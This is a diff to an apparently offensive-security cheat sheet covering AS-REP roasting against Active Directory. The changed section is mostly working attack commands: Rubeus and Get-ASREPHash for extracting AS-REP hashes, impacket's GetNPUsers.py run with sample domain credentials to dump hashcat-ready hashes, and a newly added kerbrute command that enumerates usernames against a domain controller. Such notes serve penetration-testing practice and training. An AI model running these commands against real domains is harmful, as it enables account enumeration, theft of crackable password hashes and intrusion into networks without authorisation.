@@ -34,7 +34,7 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get sear
 ```
 
 ### Request AS_REP message
-```
+```powershell
 # Windows 
 ## Rubeus 
 ### This will automatically find all accounts that do not require preauthentication and extract their AS-REP hashes
@@ -47,11 +47,15 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get sear
 Get-ASREPHash -Username VPN114user -verbose 
 
 # Linux
+# GetNPUsers
 ## Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 
-##Use domain creds to extract targets and target them
+## Use domain creds to extract targets and target them
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+
+# kerbrute
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
 ```
 ### crack
 ```shell
